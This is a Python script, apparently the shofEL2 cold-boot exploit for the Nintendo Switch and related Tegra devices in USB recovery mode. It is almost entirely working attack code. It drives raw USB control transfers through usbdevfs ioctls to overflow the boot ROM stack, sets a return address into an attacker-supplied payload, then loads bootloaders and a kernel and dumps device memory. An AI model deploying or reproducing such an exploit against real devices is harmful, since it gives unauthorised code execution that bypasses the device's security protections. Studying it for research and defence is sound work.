#!/usr/bin/env python3

# shofEL2 nintendo switch (and related) cold boot exploit
#------------------------------------------------------------------------------
# Switch will enter RCM if (PMC_SCRATCH0 & 2) is set, or if coldboot path
# fails to find something to boot. So just disconnect/corrupt emmc during
# early boot.
import usb.core
import usb.util
import errno
import time
import binascii
import struct
import sys
import os
import hashlib
import ctypes
import fcntl

USBDEVFS_URB_TYPE_CONTROL = 2
USBDEVFS_SUBMITURB = 0x8038550a
USBDEVFS_REAPURB = 0x4008550c
USBDEVFS_DISCARDURB = 0x0000550b

def parse32(buf, offset):
    return struct.unpack('<L', buf[offset:offset+4])[0]

def wait_for_device(dev_id):
    dev = usb.core.find(idVendor=dev_id[0], idProduct=dev_id[1])
    while dev is None:
        time.sleep(0.1)
        dev = usb.core.find(idVendor=dev_id[0], idProduct=dev_id[1])
    return dev

# lol
def get_fds():
    return set(int(i) for i in os.listdir("/proc/self/fd"))

class RCM:
    DEV_ID_JETSON = (0x0955, 0x7721)
    DEV_ID_SWITCH = (0x0955, 0x7321)
    EP1_OUT = usb.util.ENDPOINT_OUT | 1
    EP1_IN = usb.util.ENDPOINT_IN | 1
    bl31_addr = 0x80000000
    uboot_addr = 0x80110000
    kernel_addr = 0x85000000
    fdt_addr = 0x8f000000
    ramdisk_addr = 0x90000000
    def __init__(s):
        fds_before = get_fds()
        s.dev = wait_for_device(s.DEV_ID_SWITCH)
        fds = get_fds() - fds_before
        s.fd = sorted(list(fds))[-1]
        print("File descriptor: %d" % s.fd)
    def ep1_read(s, size): return s.dev.read(s.EP1_IN, size)
    def ep1_write(s, data): return s.dev.write(s.EP1_OUT, data)
    def read_init_msg(s):
        # rcm_send_chip_id_and_version
        try:
            return s.ep1_read(0x10)
        except:
            return b''
    def ep0_read(s, size):
        return s.dev.ctrl_transfer(0x82, 0, 0, 0, size)
    def ep0_read_unbounded(s, size):
        print("Size: 0x%x\n" % size)
        buf = ctypes.create_string_buffer(struct.pack("@BBHHH%dx" % size, 0x82, 0, 0, 0, size))
        print(binascii.hexlify(buf[:8]))
        urb = ctypes.create_string_buffer(struct.pack("@BBiIPiiiiiIP1024x",
                          USBDEVFS_URB_TYPE_CONTROL, 0, # type, ep
                          0, 0, # status, flags
                          ctypes.addressof(buf), len(buf), 0, # buf, len, actual
                          0, 0, 0, 0, 0xf0f))
        print(binascii.hexlify(urb[:-1024]))
        print("URB address: 0x%x" % ctypes.addressof(urb))
        fcntl.ioctl(s.fd, USBDEVFS_SUBMITURB, urb)
        time.sleep(0.1)
        fcntl.ioctl(s.fd, USBDEVFS_DISCARDURB, urb)
        purb = ctypes.c_void_p()
        fcntl.ioctl(s.fd, USBDEVFS_REAPURB, purb)
        if purb.value != ctypes.addressof(urb):
            print("Reaped the wrong URB! addr 0x%x != 0x%x" % (
                purb.value, ctypes.addressof(urb)))
        _, _, status, _, _, _, _, _, _, _, _, ctx = struct.unpack("@BBiIPiiiiiIP", urb[:56])
        print("URB status: %d" % status)
        if ctx != 0xf0f:
            print("Reaped the wrong URB! ctx=0x%x" % ctx)
    def sanity_check(s, src_base, dst_base):
        # check the stack and buffers look as expected
        buf = s.ep0_read(0x1000)
        cur_src = parse32(buf, 0xc)
        cur_dst = parse32(buf, 0x14)
        #print(binascii.hexlify(buf[:0x20]))
        assert cur_src == src_base and cur_dst == dst_base
    def binload(s, arg):
        try:
            data = open(sys.argv[arg], 'rb').read()
        except:
            data = []
        return data
    def send(s, name, addr, data):
        print('sending %s (%u bytes) @0x%x' % (name, len(data), addr))
        s.ep1_write('RECV')
        s.ep1_write(struct.pack('>II', addr, len(data)))
        while len(data) > 0:
            chunk = data[:32*1024]
            s.ep1_write(chunk)
            data = data[32*1024:]
    def cmd(s):
        uboot = s.binload(2)
        bl31 = s.binload(3)
        fdt = s.binload(4)
        kernel = s.binload(5)
        ep = None
        if len(uboot) > 0:
            s.send('u-boot', s.uboot_addr, uboot)
            ep = s.uboot_addr
            if len(bl31) > 0:
                s.send('bl31', s.bl31_addr, bl31)
                ep = s.bl31_addr
            if len(fdt) > 0:
                s.send('fdt', s.fdt_addr, fdt)
            if len(kernel) > 0:
                s.send('kernel', s.kernel_addr, kernel)
            print('bootstrapping ccplex @0x%x' % ep)
            s.ep1_write('BOOT')
            s.ep1_write(struct.pack('>I', ep))
            sys.exit(0)
        else:
            print('exiting')
            s.ep1_write('EXIT')
    def cbfs(s):
        data = s.binload(2)
        if len(data) < 20 * 1024:
            print('invalid coreboot.rom')
            return
        while True:
            (offset, length) = struct.unpack('>II', s.ep1_read(8))
            if offset + length == 0:
                print('you have been served')
                sys.exit(0)
            print('sending 0x%x bytes @0x%x' % (length, offset))
            while length > 0:
                l = length
                if l > 32 * 1024:
                    l = 32 * 1024
                s.ep1_write(data[offset:offset + l])
                offset = offset + l
                length = length - l
    def pwn(s):
        # this is sp+0xc
        src_base = 0x4000fc84
        # memcpy pushes r4,lr
        # memcpy_wrapper pushes r0,lr
        target = src_base - 0xc - 2 * 4 - 2 * 4
        dst_base = 0x40009000
        overwrite_len = target - dst_base
        payload_base = 0x40010000

        # rom is in rcm_send_chip_id_and_version
        # unblock it
        init_msg = s.read_init_msg()
        print(binascii.hexlify(init_msg))

        # now in rcm_recv_buf
        s.sanity_check(src_base, dst_base)

        # need to build payload buffer
        # write header
        s.ep1_write(struct.pack('<L', 0x30008) + b'\0' * 0x2a4)
        # write payload
        payload = struct.pack('<L', 0) * 0x1a3a
        # payload+0x1a3a*4 = retaddr
        # uart boot greeting msg
        #payload += struct.pack('<L', 0x11081C|1)
        # rcm_send32(garbage in r0)
        #payload += struct.pack('<L', 0x1023FC|1)
        # rcm_send32(0)
        #payload += struct.pack('<L', 0x102716|1)
        # return to self
        entry = payload_base + len(payload) + 4
        entry |= 1
        print('entry %x' % (entry))
        payload += struct.pack('<L', entry)

        try:
            payload_filename = sys.argv[1]
        except IndexError:
            payload_filename = 'inject.bin'
        payload += open(payload_filename, 'rb').read()

        xfer_len = 0x1000
        for i in range(0, len(payload), xfer_len):
            s.ep1_write(payload[i:i+xfer_len])

        try:
            s.sanity_check(src_base, dst_base)
        except:
            print('throwing more')
            s.ep1_write(b'\0' * xfer_len)

        # trigger stack overwrite from the payload buf (accessed by reading
        # off the end of rcm_xfer_buffers[1])
        print("Performing hax...")
        s.ep0_read_unbounded(overwrite_len)

        tty_mode = True
        while tty_mode:
            try:
                data = s.ep1_read(4096).tostring()
                if data == "\xde\xad\xbe\xef":
                    tty_mode = False
                    print('>>> Switching to dumping mode...')
                else:
                    #data = data.decode('utf-8')
                    print(repr(data))
                    if data.split(b'\n')[0] == b'READY.':
                        print('>>> Switching to cmd mode...')
                        s.cmd()
                    elif data.split(b'\n')[0] == b'CBFS':
                        print('>>> Switching to cbfs mode...')
                        s.cbfs()
            except usb.core.USBError as e:
                if e.errno == errno.ENODEV:
                    print('usb device lost, reconnecting...')
                    s.dev = wait_for_device(s.DEV_ID_SWITCH)
                else:
                    time.sleep(0.1)
        h = hashlib.sha1()
        fp = open('../dump.bin', 'wb')
        recvd_size = 0
        while True:
            data = s.ep1_read(4096).tostring()
            if len(data) == 20:
                # Last block, SHA1
                print('>>> Done! Expected sha1:', data.encode('hex'),
                        'received:', h.hexdigest())
                break
            else:
                h.update(data)
                fp.write(data)
                recvd_size += len(data)
                if recvd_size % 2**20 == 0:
                    print(recvd_size / 2**20, 'MiB received')

rcm = RCM()
rcm.pwn()
